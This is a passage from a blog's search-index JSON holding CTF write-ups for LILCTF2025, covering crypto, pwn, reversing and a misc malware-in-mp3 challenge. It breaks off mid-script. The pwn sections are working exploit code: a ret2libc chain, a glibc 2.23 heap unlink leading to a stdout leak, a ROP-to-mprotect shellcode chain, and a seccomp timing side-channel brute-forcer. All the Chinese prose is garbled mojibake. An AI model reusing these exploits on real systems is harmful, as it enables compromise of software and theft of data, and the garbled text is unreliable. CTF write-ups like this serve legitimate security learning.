","date":"2025-08-21","objectID":"/moeqzmmr/:2:19","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"æ€»ç»“ å¾ˆå¤šéƒ½æ˜¯moe22\u002621çš„é¢˜ï¼Œè´¨é‡æŒºé«˜çš„ï¼Œæ ¼éƒ¨åˆ†æ²¡æ€ä¹ˆå†™ï¼Œå¹³å°ä¸Šé¢ä¹Ÿæœ‰expï¼Œå°±è¿™æ ·å§ ","date":"2025-08-21","objectID":"/moeqzmmr/:3:0","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"LILCTF2025,crypto,web,pwn,misc,re,wp,Bluebud","date":"2025-08-18","objectID":"/lilctf2025/","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"å‰è¨€ rank19ï¼Œç•¥å¾®é—æ†¾ï¼Œæœ€ååŒºå—é“¾æ²¡åšå‡ºæ¥ï¼Œä¸‹é¢æŠŠwpæ±‡æ€»ä¸€ä¸‹ ","date":"2025-08-18","objectID":"/lilctf2025/:1:0","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"Crypto(zsm) ","date":"2025-08-18","objectID":"/lilctf2025/:2:0","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"ez_math task.py from sage.all import * from Crypto.Util.number import * from tqdm import tqdm from random import randint from Crypto.Cipher import AES from Crypto.Util.Padding import pad flag = b'LILCTF{test_flag}' p = getPrime(64) P = GF(p) key = randint(2**62, p) def mul(vector, c): return [vector[0]*c, vector[1]*c, vector[2]*c, vector[3]*c, vector[4]*c] v1 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)] v2 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)] v3 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)] v4 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)] v5 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)] a, b, c, d, e = getPrime(64), getPrime(64), getPrime(64), getPrime(64), 0 A = matrix(P, [v1, v2, v3, v4, v5]) B = matrix(P, [mul(v1,a), mul(v2,b), mul(v3, c), mul(v4, d), mul(v5, e)]) C = A.inverse() * B D = C**key key = pad(long_to_bytes(key), 16) aes = AES.new(key,AES.MODE_ECB) msg = aes.encrypt(pad(flag, 64)) print(f\"p = {p}\") print(f'C = {[i for i in C]}'.replace('(', '[').replace(')', ']')) print(f'D = {[i for i in D]}'.replace('(', '[').replace(')', ']')) print(f\"msg = {msg}\") çŸ©é˜µBæ˜¯å¯¹è§’çŸ©é˜µL*çŸ©é˜µAå¾—åˆ°ï¼ŒC=A^{-1}B=A^{-1}LAï¼Œæ˜¾è€Œæ˜“è§å°±æ˜¯çŸ©é˜µçš„ç›¸ä¼¼å˜æ¢ï¼Œlambda1 å’Œ lambda2 æ­£æ˜¯çŸ©é˜µ C çš„ä¸¤ä¸ªç‰¹å¾å€¼ï¼Œç›´æ¥æ‰“å°±è¡Œäº† exp.py from sage.all import * from Crypto.Util.number import long_to_bytes p = C_list = F = GF(p) C_matrix = matrix(F, C_list) eigenvalues = C_matrix.eigenvalues() print(f\"[*] Found eigenvalues: {eigenvalues}\") lambda_val1 = int(eigenvalues[0]) lambda_val2 = int(eigenvalues[1]) flag_part1 = long_to_bytes(lambda_val1) flag_part2 = long_to_bytes(lambda_val2) try: flag_attempt1 = b'LILCTF{' + flag_part1 + flag_part2 + b'}' print(f\"[+] Attempt 1: {flag_attempt1.decode()}\") except UnicodeDecodeError: print(f\"[!] Attempt 1 resulted in non-printable characters.\") try: flag_attempt2 = b'LILCTF{' + flag_part2 + flag_part1 + b'}' print(f\"[+] Attempt 2: {flag_attempt2.decode()}\") except UnicodeDecodeError: print(f\"[!] Attempt 2 resulted in non-printable characters.\") ","date":"2025-08-18","objectID":"/lilctf2025/:2:1","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"mid_math task.py from sage.all import * from Crypto.Util.number import * flag = b'LILCTF{test_flag}'[7:-1] lambda1 = bytes_to_long(flag[:len(flag)//2]) lambda2 = bytes_to_long(flag[len(flag)//2:]) p = getPrime(512) def mul(vector, c): return [vector[0]*c, vector[1]*c] v1 = [getPrime(128), getPrime(128)] v2 = [getPrime(128), getPrime(128)] A = matrix(GF(p), [v1, v2]) B = matrix(GF(p), [mul(v1,lambda1), mul(v2,lambda2)]) C = A.inverse() * B print(f'p = {p}') print(f'C = {str(C).replace(\" \", \",\").replace(\"\\n\", \",\").replace(\"[,\", \"[\")}') ä¸»è¦æ˜¯æ±‚keyï¼Œä¸»è¦è¿˜æ˜¯ç”¨eigenvalueså»ç®—ç‰¹å¾å€¼ï¼Œç„¶åå»éå†é…å¯¹CDçš„ï¼Œç„¶åç¦»æ•£æ±‚è§£ exp.py from sage.all import * from Crypto.Util.number import long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import itertools p = C_list = D_list = msg = P = GF(p) C = matrix(P, C_list) D = matrix(P, D_list) eigenvalues_C = C.eigenvalues() eigenvalues_D = D.eigenvalues() non_zero_C = [e for e in eigenvalues_C if e != 0] non_zero_D = [e for e in eigenvalues_D if e != 0] found_key = None for D_perm in itertools.permutations(non_zero_D): try: lambda_c1 = non_zero_C[0] lambda_d1 = D_perm[0] candidate_key = discrete_log(lambda_d1, lambda_c1) verified = True for i in range(1, len(non_zero_C)): lambda_ci = non_zero_C[i] lambda_di = D_perm[i] if pow(lambda_ci, candidate_key, p) != lambda_di: verified = False break if verified: found_key = candidate_key print(f\"\\n[+] Successfully found and verified the key!\") print(f\" key = {found_key}\") break except (ValueError, TypeError): continue if found_key: key_int = int(found_key) aes_key = pad(long_to_bytes(key_int), 16) cipher = AES.new(aes_key, AES.MODE_ECB) decrypted_padded = cipher.decrypt(msg) flag = unpad(decrypted_padded, 64) print(f\"\\n[+] AES Key (bytes): {aes_key.hex()}\") print(f\"[+] Decrypted Flag: {flag.decode()}\") else: print(\"\\n[-] Could not find the key.\") ","date":"2025-08-18","objectID":"/lilctf2025/:2:2","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"Linear task.py import os import random import signal signal.alarm(10) flag = os.getenv(\"LILCTF_FLAG\", \"LILCTF{default}\") nrows = 16 ncols = 32 A = [[random.randint(1, 1919810) for _ in range(ncols)] for _ in range(nrows)] x = [random.randint(1, 114514) for _ in range(ncols)] b = [sum(A[i][j] * x[j] for j in range(ncols)) for i in range(nrows)] print(A) print(b) xx = list(map(int, input(\"Enter your solution: \").strip().split())) if xx != x: print(\"Oh, your linear algebra needs to be practiced.\") else: print(\"Bravo! Here is your flag:\") print(flag) æ­£å¸¸çš„æ ¼ï¼Œæœ¬åœ°æ˜¯mac+kittyçš„ç»„åˆï¼Œsageé‡Œé¢äº¤äº’æœ‰ç‚¹é—®é¢˜ï¼Œæœ¬æ¥æƒ³å…ˆæ‹¿æ•°æ®ï¼Œç»“æœå‘ç°æœ‰æ—¶é—´é™åˆ¶ï¼Œæ‰‹é€Ÿä¸å¤Ÿå¿«broï¼Œæ ¼å°±æ˜¯ä¸ªAx=Bï¼Œä¹Ÿå°±æ˜¯Ay=0ï¼Œè¿™é‡Œç›´æ¥ç®—ä¸€ç»„åŸºï¼Œç„¶åLLLã€‚æ³¨æ„æ¥æ”¶æ˜¯æ”¶æ­£æ•°ï¼Œåˆ¤å®šä¸€ä¸‹ exp.py import os import json from pwn import * from sage.all import * # ä¿®å¤ç¯å¢ƒé—®é¢˜ os.environ['TERM'] = 'xterm' os.environ['TERMINFO'] = '/usr/share/terminfo' context.log_level = 'info' # å…ˆè®¾ç½®ä¸º infoï¼Œå¦‚æœè¿˜ä¸è¡Œå†æ”¹å› debug p = remote('challenge.xinshi.fun', 47103) A_str = p.recvline().decode().strip() b_str = p.recvline().decode().strip() try: A_list = json.loads(A_str) b_list = json.loads(b_str) except (json.JSONDecodeError, SyntaxError): A_list = eval(A_str) b_list = eval(b_str) Z = Integers() A = matrix(Z, A_list) b = vector(Z, b_list) A_prime = A.augment(-b) kernel = A_prime.right_kernel() B = kernel.basis_matrix() B_lll = B.LLL() short_vector = B_lll[0] payload = None s1 = short_vector if s1[-1] != 0: if s1[-1] \u003c 0: s1 = -s1 y1 = s1 / s1[-1] x1 = [int(v) for v in y1[:-1]] if all(v \u003e 0 for v in x1): payload = ' '.join(map(str, x1)) print(\"[+] Found an all-positive solution vector. This should be the one.\") if payload is None: s_default = short_vector if s_default[-1] \u003c 0: s_default = -s_default y_default = s_default / s_default[-1] x_default = [int(v) for v in y_default[:-1]] payload = ' '.join(map(str, x_default)) print(f\"[*] Sending payload: {payload[:80]}...\") p.sendlineafter(b'Enter your solution: ', payload.encode()) p.interactive() ","date":"2025-08-18","objectID":"/lilctf2025/:2:3","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"Space Travel task.py from hashlib import md5 from os import urandom from Crypto.Cipher import AES from params import vecs key = int(\"\".join([vecs[int.from_bytes(urandom(2)) \u0026 0xfff] for _ in range(50)]), 2) print(\"ğŸ :\", [[nonce := int(urandom(50*2).hex(), 16), (bin(nonce \u0026 key).count(\"1\")) % 2] for _ in range(600)]) print(\"ğŸš© :\", AES.new(key=md5(str(key).encode()).digest(), nonce=b\"Tiffany\", mode=AES.MODE_CTR).encrypt(open(\"flag.txt\", \"rb\").read())) é—®äº†ä¸€ä¸‹aiï¼Œè·Ÿæˆ‘è¯´è¿™æ˜¯LPNé—®é¢˜ï¼Œå’ŒLWEçš„å·®åˆ«åœ¨äºæ²¡æœ‰eï¼Œå°è¯•æ”¹cvpå’Œsvpçš„è„šæœ¬ï¼Œå‡ºä¸æ¥ï¼Œå°è¯•çˆ†ç ´2**16çš„æ•°é‡åŸºï¼Œå‘ç°æ ¹æœ¬è·‘ä¸å‡ºæ¥ï¼Œäº”ä¸ªå°æ—¶ä¸èƒ½å‡ºæ¥ï¼Œç»§ç»­æ”¹å˜æ€è·¯ï¼Œå°è¯•æ‰“æ ¼ï¼Œ800ä½†æ˜¯åªæœ‰600çš„æ•°æ®ï¼Œç›®å‰ä¸å¤ªä¼š.åé¢å‘ç°ï¼ŒåŠ å¯† key å…¶å®æ˜¯é€šè¿‡ çº¿æ€§ç»„åˆ vecs è¡¨ ç”Ÿæˆçš„ï¼Œ(nonce \u0026 key) % 2 å¯ä»¥çœ‹ä½œçº¿æ€§æ–¹ç¨‹ç»„ä¸­çš„ä¸€è¡Œï¼ˆmod 2ï¼‰ï¼Œæˆ‘å¯ä»¥ç”¨é«˜æ–¯æ¶ˆå…ƒæ±‚å‡ºkeyï¼Œæ±‚å‡ºä¹‹åä¸¢ç»™aiåˆ†æï¼Œå‘ç°ç³»ç»Ÿç§© 599ï¼Œæœ‰ 1 ä¸ªè‡ªç”±åº¦ï¼Œé‚£ä¹ˆæœ‰ä¸€ä¸ªå°±æ˜¯flagã€‚è¿™é‡Œæ•´ä¸ªä»£ç ç”±aiç¼–å†™ï¼Œæˆ‘åªè´Ÿè´£æä¾›æ€è·¯ expç•¥ ","date":"2025-08-18","objectID":"/lilctf2025/:2:4","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"Baaaaaag task.py from Crypto.Util.number import * import random from Crypto.Cipher import AES import hashlib from Crypto.Util.Padding import pad from secret import flag p = random.getrandbits(72) assert len(bin(p)[2:]) == 72 a = [getPrime(90) for _ in range(72)] b = 0 t = p for i in a: temp = t % 2 b += temp * i t = t \u003e\u003e 1 key = hashlib.sha256(str(p).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) flag = pad(flag,16) ciphertext = cipher.encrypt(flag) print(f'a = {a}') print(f'b = {b}') print(f\"ciphertext = {ciphertext}\") ä¸€ä¸ªæ­£å¸¸çš„èƒŒåŒ…ç®—æ˜¯ï¼Œ0.8000799299496527\u003c9.04ï¼Œå‘ç°å’Œhgame2024çš„é¢˜æœ‰ç‚¹åƒï¼Œç¿»ä¸€ä¸‹è„šæœ¬ï¼Œæ‰¾åˆ°lazä½¬çš„ï¼Œç›´æ¥BKZæ±‚ä¸å‡ºæ¥ï¼ŒåŠ ä¸Šblock_size=30ï¼ˆè¶Šå¤§è¶Šç²¾å‡†ï¼Œè€—æ—¶è¶Šé•¿ï¼‰ exp.py from sage.all import * a = bag = print(bag) print(len(a)) n = len(a) # Sanity check for application of low density attack d = n / log(max(a), 2) print(CDF(d)) assert CDF(d) \u003c 0.9408 M = Matrix.identity(n) * 2 last_row = [1 for x in a] M_last_row = Matrix(ZZ, 1, len(last_row), last_row) last_col = a last_col.append(bag) M_last_col = Matrix(ZZ, len(last_col), 1, last_col) M = M.stack(M_last_row) M = M.augment(M_last_col) X = M.BKZ(block_size=30) sol = [] for i in range(n + 1): testrow = X.row(i).list()[:-1] if set(testrow).issubset([-1, 1]): for v in testrow: if v == 1: sol.append(0) elif v == -1: sol.append(1) break s = sol print(s) ","date":"2025-08-18","objectID":"/lilctf2025/:2:5","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"Pwn(vrtua) ","date":"2025-08-18","objectID":"/lilctf2025/:3:0","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"Signin ç®€å•ret2libc from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" ru(b\"name?\") s( b\"a\" * 0x78 + p(0x000401176) + p(elf.got[\"puts\"]) + p(0x0000000000401060) + p(0x0000000000401178) ) rl() base = u(r(6).ljust(8, b\"\\0\")) - 0x0000000000080E50 success(hex(base)) system = base + 0x0000000000050D70 binsh = base + 0x00000000001D8678 payload = b\"a\" * 0x78 + p(0x000401176) + p(binsh) + p(0x000000000040101A) + p(system) s(payload) ia() ","date":"2025-08-18","objectID":"/lilctf2025/:3:1","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"heappivot å¢åˆ æ”¹é™æ€å †ï¼Œ0x100å›ºå®šå¤§å°uafï¼Œæ ¹æ®é¢˜ç›®æè¿°ä¸º2.23ç‰ˆæœ¬ï¼Œæ•…å¯é€šè¿‡æ‰“unlinké€ æˆheaplist[i] = \u0026heaplistå®ç°ä»»æ„å†™ æ²¡æœ‰è¾“å‡ºå‡½æ•°ï¼Œäºæ˜¯æ‰“stdout + freehook(fflush)æ³„éœ²environï¼Œç„¶åé€šè¿‡ä»»æ„å†™å»æ‰“æ ˆ from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" def menu(): ru(b\"Your choice:\\n\") def alloc(idx, content=b\"a\\n\"): menu() sl(b\"1\") ru(b\"idx:\") sl(str(idx)) ru(b\"say\\n\") s(content) def free(idx): menu() sl(b\"2\") ru(b\"idx:\") sl(str(idx)) def edit(idx, content): menu() sl(b\"3\") ru(b\"idx:\") sl(str(idx)) ru(b\"context: \") s(content) b(\"set glibc 2.23\") # max_fast = 0x00000000006CC638 free_list = 0x00000000006CC628 heap_list = 0x6CCD60 main_arena = 0x6CA858 free_hook = 0x6CC5E8 flush_all = 0x000000000416770 _mprotect = 0x0000000004407F0 _readin = 0x00000000043FCA0 stdout = 0x00000000006CA300 alloc(0) alloc(1) alloc(2) alloc(3) alloc(4) alloc(1) alloc(4) free(0) free(2) free(1) edit(0, p(0) + p8(0x80)) # p8(0xC0)) edit(2, p(0) + p(0x111) + p(0) + p(0x6CCD60 + 0x8 * 6)) alloc(4) alloc(4, b\"a\" * 0xF0 + p(0x100) + p(0x110)) edit(2, p(0) + p(0x101) + p(0x6CCD60 - 8) + p(0x6CCD60)) free(3)# trigger unlink edit(2, p(0) + p(0x6CC5E8) + p8(0xE0)) # free_hook payload = p(0) + p(0x20) + p(0) * 2 + p(0x21) * 2 + p(0) * 2 + p(0x21) * 2 edit(1, payload) edit(0, p(flush_all)) edit(2, p(0) + p(0x6CCD90)) payload = (p(0) + p(0x90) + 2 * p(main_arena)).ljust(0x90, b\"\\0\") + p(0x91) + p(0x91) edit(0, payload) edit(2, p(0) + p(stdout)) io_padding = 0x00000000006CA383 environ = 0x00000000006CC640 payload = p(0xFBAD1800) + p(io_padding) * 3 + p(environ) + p(environ + 6) * 2 edit(0, payload) edit(0, payload) alloc(0) free(0) stack = u(r(6).ljust(8, b\"\\0\")) - 0x180 success(hex(stack)) prdi = 0x0000000000401A16 prsi = 0x0000000000401B37 prdx = 0x0000000000443136 dest = 0x6CC000 payload = ( p(prdi) + p(dest) + p(prsi) + p(0x100) + p(prdx) + p(7) + p(_mprotect) + p(prdi) + p(0) + p(prsi) + p(dest) + p(prdx) + p(0x100) + p(_readin) + p(dest) ) edit(2, p(0) + p(stack)) edit(0, payload) shellcode = shellcraft.open(\"./flag\") shellcode += shellcraft.read(\"rax\", \"rsp\", 0x30) shellcode += shellcraft.write(1, \"rsp\", 0x30) shellcode = asm(shellcode) s(shellcode) ia() ","date":"2025-08-18","objectID":"/lilctf2025/:3:2","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"The Truman Show shellcodeï¼Œé¢˜ç›®ä»…å…è®¸ä½¿ç”¨5ä¸ªæŒ‡å®šsyscallå¹¶åªèƒ½è¾“å…¥0x23é•¿çš„shellcode 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u003c 0x40000000) goto 0005 0004: 0x15 0x00 0x06 0xffffffff if (A != 0xffffffff) goto 0011 0005: 0x15 0x04 0x00 0x00000000 if (A == read) goto 0010 0006: 0x15 0x03 0x00 0x0000003c if (A == exit) goto 0010 0007: 0x15 0x02 0x00 0x00000053 if (A == mkdir) goto 0010 0008: 0x15 0x01 0x00 0x000000a1 if (A == chroot) goto 0010 0009: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL é¦–å…ˆè‚¯å®šéœ€è¦openatå’Œreadä¸¤ä¸ªè°ƒç”¨å…ˆè¯»å‡ºflagï¼Œå› ä¸ºæ²¡æœ‰è¾“å‡ºæ•…è€ƒè™‘ä¾§ä¿¡é“æ³„éœ²flag åªç»™äº†0x23é•¿ï¼Œshellcodeå†™çš„æœ‰ç‚¹æé™ å› ä¸ºbanäº†cmpç«‹å³æ•°å­—èŠ‚ï¼Œä½¿ç”¨subä»£æ›¿ é¢˜ç›®banæ‰äº†8,9,;,:è¿™å‡ ä¸ªå­—ç¬¦ï¼Œå¦‚æœflagåŒ…å«è¿™äº›å­—ç¬¦ä¼šæœ‰å½±å“ï¼Œäºæ˜¯å…ˆæ³„éœ²å‡ºæ²¡bançš„å­—ç¬¦ï¼Œå¾—åˆ°flagï¼šLILCTF{64_6df56-2dbf-4c0d-a_cd-1_4c__f_f_a3} æ¥ç€ç»§ç»­ä¼˜åŒ–shellcodeï¼Œçœå‡ºä¸¤ä¸ªå­—èŠ‚ååœ¨jzå‰å¢åŠ ä¸€æ¡sub one_byte_of_flag, 1é¿å…è¾“å…¥è¿ç¦å­—ç¬¦å¯¼è‡´è¿‡æ»¤ å°†æœªçŸ¥å­—ç¬¦ä¸€ä¸ªä¸€ä¸ªæ³„éœ²å‡ºæ¥åæœ€ç»ˆå¾—åˆ°flagï¼šLILCTF{6496df56-2dbf-4c0d-a9cd-194c98f9f8a3} from pwnfunc import * def single_exp(single_char, idx): # single_char = \"7\" io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" shellcode = ( f\"mov al, byte ptr [rsp + {hex(idx)}]\\n\" # + \"sub al, 1\\n\" + \"sub al, \" + hex(ord(single_char)) ) info(\"current flag: \" + Flag) info(shellcode) shellcode = asm(shellcode) ru(b\"Now it's your show time\\n\") s(shellcode_of_open_read + shellcode + shellcode_of_loop) try: data_from_server = io.recv(timeout=10) io.close() except EOFError: io.close() info(\"got eof error\") return False except TimeoutError: io.close() info(\"got time out error\") return True if data_from_server == b\"\": info(\"empty respond\") return True context.arch = \"amd64\" shellcode_of_open_read = asm( \"\"\" pop rdx pop rdx mov ax, 257 push 2 pop rdi push 0x67616c66 push rsp pop rsi syscall xchg edi, eax xchg edx, eax xchg r11, rdx syscall \"\"\" ) shellcode_of_loop = asm(\"jz short $\") Flag = \"LILCTF{\" # LILCTF{64_6df56-2dbf-4c0d-a_cd-1_4c__f_f_a3} # raw # LILCTF{6496df56-2dbf-4c0d-a9cd-194c98f9f8a3} # manually fixed idx = len(Flag) Break = False priority_ranges = [ (123, 123), # { (125, 125), # } (95, 95), # _ (45, 45), # - (48, 57), # 0-9 (97, 122), # a-z # (65, 90), # A-Z ] # 2. å‰©ä½™å¯è§ASCIIå­—ç¬¦ï¼ˆ32-126ï¼Œæ’é™¤å·²æ£€æµ‹çš„ï¼‰ all_visible_codes = range(32, 127) priority_codes = { code for (start, end) in priority_ranges for code in range(start, end + 1) } remaining_codes = [code for code in all_visible_codes if code not in priority_codes] # 3. ä¸»å¾ªç¯ï¼šå…ˆæ£€æµ‹ä¼˜å…ˆå­—ç¬¦ï¼Œå†æ£€æµ‹å‰©ä½™å­—ç¬¦ while not Break: for start, end in priority_ranges: for code in range(start, end + 1): char = chr(code) info(f\"Checking char: {char} (priority)\") if single_exp(char, idx): Flag += char idx += 1 success(f\"Found: {char} at position [{idx-1}]\") success(Flag) if char == \"}\": Break = True break break else: continue break # æ‰¾åˆ°å­—ç¬¦ï¼Œè·³å‡º priority_ranges å¾ªç¯ else: # å¦‚æœ priority_ranges å…¨éƒ¨æœªæ‰¾åˆ°ï¼Œå°è¯•å‰©ä½™å­—ç¬¦ # for code in remaining_codes: # char = chr(code) # info(f\"Checking char: {char} (remaining)\") # if single_exp(char, idx): # Flag += char # idx += 1 # success(f\"Found: {char} at position [{idx-1}]\") # success(Flag) # if char == \"}\": # Break = True # break # æ‰¾åˆ°å­—ç¬¦ï¼Œè¿›å…¥ä¸‹ä¸€ä½ç½® # else: # æ‰€æœ‰å­—ç¬¦å‡æœªæ‰¾åˆ°ï¼Œå¯èƒ½å‡ºé”™ info(\"No valid character found!\") Flag += \"_\" # banned char, in range of 8 and 9 idx += 1 info(\"end of side-channel attack\") success(Flag) ia() ","date":"2025-08-18","objectID":"/lilctf2025/:3:3","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"Re(zsm) ","date":"2025-08-18","objectID":"/lilctf2025/:4:0","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"ARM ASM å…ˆæŠŠapkè§£åŒ…ï¼Œæ‹¿åˆ°hahahaé‚£ä¸ªsoæ–‡ä»¶ï¼Œæ‰”idaé‡Œé¢å¯ä»¥çœ‹è§é€»è¾‘ 1.è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦å¿…é¡»æ˜¯48å­—ç¬¦ 2.å¯¹æ¯16å­—èŠ‚è¿›è¡Œä¸€ç³»åˆ—NEONæŒ‡ä»¤æ“ä½œï¼ˆç½®æ¢è¡¨å˜æ¢å’Œå¼‚æˆ–ï¼‰ 3.å¯¹æ¯3å­—èŠ‚è¿›è¡Œä½è¿ç®—æ“ä½œ 4.æœ€åè¿›è¡ŒBase64ç¼–ç  ç„¶åjadxå¯åŠ¨ï¼Œå¯ä»¥æ‰¾åˆ°å¯†æ–‡æ˜¯KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09Sï¼Œå†™ä¸ªè„šæœ¬ import base64 def decode_custom_base64(encoded_str, custom_base64_chars): standard_chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" translation_table = str.maketrans(custom_base64_chars, standard_chars) standard_encoded = encoded_str.translate(translation_table) # è§£ç  try: decoded_bytes = base64.b64decode(standard_encoded) return decoded_bytes except Exception as e: print(f\"Base64è§£ç å¤±è´¥: {e}\") return None def reverse_bit_operations(data): result = bytearray(data) for j in range(0, len(result), 3): if j + 2 \u003c len(result): original_j = ((result[j] \u0026 0x07) \u003c\u003c 5) | ((result[j] \u0026 0xF8) \u003e\u003e 3) original_j1 = ((result[j + 1] \u0026 0x7F) \u003c\u003c 1) | ((result[j + 1] \u0026 0x80) \u003e\u003e 7) result[j] = original_j \u0026 0xFF result[j + 1] = original_j1 \u0026 0xFF return bytes(result) def reverse_neon_operations(data): t = [0xD, 0xE, 0xF, 0xC, 0xB, 0xA, 9, 8, 6, 7, 5, 4, 2, 3, 1, 0] reverse_t = [0] * 16 for i in range(16): reverse_t[t[i]] = i result = bytearray(data) v10 = bytearray(t) v10_states = [bytearray(v10)] for i in range(3): for j in range(16): v10[j] ^= i v10_states.append(bytearray(v10)) for i in range(2, -1, -1): current_v10 = v10_states[i] block_start = 16 * i block_data = result[block_start:block_start + 16] for j in range(16): block_data[j] ^= current_v10[j] original_block = bytearray(16) for j in range(16): if current_v10[j] \u003c 16: original_block[current_v10[j]] = block_data[j] result[block_start:block_start + 16] = original_block return bytes(result) def solve_flag(): encrypted_flag = \"KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S\" custom_base64 = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/\" decoded_data = decode_custom_base64(encrypted_flag, custom_base64) if decoded_data is None: print(\"Base64è§£ç å¤±è´¥\") return after_bit_reverse = reverse_bit_operations(decoded_data) print(f\"é€†å‘ä½è¿ç®—å: {after_bit_reverse.hex()}\") flag_bytes = reverse_neon_operations(after_bit_reverse) print(f\"æœ€ç»ˆç»“æœ: {flag_bytes.hex()}\") try: flag = flag_bytes.decode('ascii') print(f\"Flag: {flag}\") except UnicodeDecodeError: simple_flag = simple_reverse(encrypted_flag, custom_base64) if simple_flag: print(f\"ç®€åŒ–é€†å‘ç»“æœ: {simple_flag}\") if __name__ == \"__main__\": solve_flag() ","date":"2025-08-18","objectID":"/lilctf2025/:4:1","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"1â€™M no7 A rO6oT ç›´æ¥è®¿é—®ï¼Œçœ‹f12ï¼Œé‡Œé¢æœ‰ä¸ªmp3çš„é“¾æ¥ï¼Œç›´æ¥curl -Oä¸‹æ¥ï¼Œbinwalkå¯ä»¥åˆ†ç¦»å‡ºæ¥ä¸€ä¸ªå›¾ç‰‡ï¼Œæ²¡ä»€ä¹ˆç”¨ï¼Œç”¨æ²™ç®±åˆ†æï¼Œå‘ç°mp3é‡Œé¢æœ‰ä¸ªjsæ–‡ä»¶ 010æ‰“å¼€åæ‰¾åˆ°ä¸‹é¢æ˜¯ä¸ªæ–‡ä»¶æå–å‡ºæ¥ï¼Œæå–å‡ºæ¥ï¼Œæ•´ä¸ªæ˜¯ä¸ªæ··æ·†æ–‡ä»¶ï¼Œæ‰”ç»™gptå±•ç¤ºaiç¥åŠ› è¿™ä¸ªé“¾æ¥æ˜¯ä¸ªå›¾ç‰‡ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œä¸¢åˆ°010é‡Œé¢ï¼Œçœ‹ä¸æ‡‚çš„æ··æ·†ï¼Œç›²çŒœæ˜¯ç»™ä¸€äº›å­—ç¬¦èµ‹å€¼äº†ï¼Œç„¶ååˆ©ç”¨äº†å­—ç¬¦å˜é‡æ„å»ºå‘½ä»¤ï¼Œç›´æ¥è®©gptå¸®å¿™å†™ä¸ªè„šæœ¬æŠŠæ··æ·†å»æ‰ï¼Œç„¶åæŠŠé‡Œé¢çš„base64ä¸²æ‹‰å‡ºæ¥è§£å¯†ï¼Œå¤§æ¦‚ç‡å°±æ˜¯flagå’Œé©¬è¦æ‰§è¡Œçš„å‘½ä»¤ import re import base64 def solve_powershell_obfuscation(payload): ps_vars = { 'u': '0', 'b': '1', 'q': '2', 'z': '3', 'o': '4', 'd': '5', 'x': '6', 'e': '7', 'i': '8', 'l': '9', } print(\"[+] Step 1: Deobfuscating the first layer (character substitution)...\") # 2. å°†æ··æ·†å­—ç¬¦ä¸²åˆ†å‰²æˆå•ç‹¬çš„å­—ç¬¦ä»£ç å— # ç§»é™¤äº†å¤´å°¾çš„ 'g' å­—ç¬¦ï¼Œå¹¶æŒ‰ '+' åˆ†å‰² char_codes_str = payload.replace('$g', 'g').split('+') decoded_command = \"\" for code_block in char_codes_str: # ç§»é™¤æ ‡è¯†ç¬¦ 'g' if code_block.startswith('g'): code_block = code_block[1:] num_str = \"\" # é€å­—ç¬¦æ›¿æ¢ä¸ºæ•°å­— for char_var in code_block: if char_var in ps_vars: num_str += ps_vars[char_var] else: # å¤„ç†å¯èƒ½çš„å¤šå­—ç¬¦å˜é‡åï¼ˆåœ¨æ­¤è„šæœ¬ä¸­ä¸å­˜åœ¨ï¼Œä½†ä½œä¸ºå¥å£®æ€§è€ƒè™‘ï¼‰ 